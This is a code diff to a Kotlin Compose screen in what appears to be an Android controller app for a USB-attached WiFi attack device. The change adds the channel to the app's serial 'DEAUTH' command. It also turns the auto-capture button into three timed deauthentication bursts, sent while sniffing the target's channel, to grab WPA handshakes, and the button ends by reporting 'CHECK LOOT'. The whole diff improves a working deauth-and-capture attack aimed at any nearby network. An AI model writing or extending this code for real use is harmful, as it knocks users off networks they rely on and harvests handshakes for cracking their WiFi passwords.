@@ -104,7 +104,8 @@ fun WiFiScreen(usbManager: UsbSerialManager) {
                         Button(
                             onClick = { 
                                 val target = net.bssid ?: net.ssid
-                                usbManager.write("DEAUTH:$target") 
+                                // Include channel for proper deauth targeting
+                                usbManager.write("DEAUTH:$target:${net.channel}") 
                                 lastAction = "DEAUTH PACKET SENT!"
                             },
                             colors = ButtonDefaults.buttonColors(containerColor = Color.Red.copy(alpha = 0.2f)),
@@ -117,15 +118,23 @@ fun WiFiScreen(usbManager: UsbSerialManager) {
                             onClick = { 
                                 isCapturing = true
                                 scope.launch {
+                                    // Start sniffing on target channel
                                     usbManager.write("SNIFF_START:${net.channel}")
-                                    // Delay to allow channel switch
-                                    delay(500)
+                                    delay(500) // Allow channel switch
+                                    
                                     val target = net.bssid ?: net.ssid
                                     if (!target.isNullOrEmpty()) {
-                                        usbManager.write("DEAUTH:$target")
-                                        lastAction = "AUTO-CAPTURE STARTED"
+                                        // Send deauth bursts - multiple rounds for better success
+                                        for (round in 1..3) {
+                                            usbManager.write("DEAUTH:$target:${net.channel}")
+                                            lastAction = "DEAUTH ROUND $round/3..."
+                                            delay(2000) // Wait 2s between rounds for handshake capture
+                                        }
+                                        lastAction = "CAPTURE COMPLETE - CHECK LOOT"
+                                        isCapturing = false
                                     } else {
                                         lastAction = "INVALID TARGET"
+                                        isCapturing = false
                                     }
                                 }
                             },
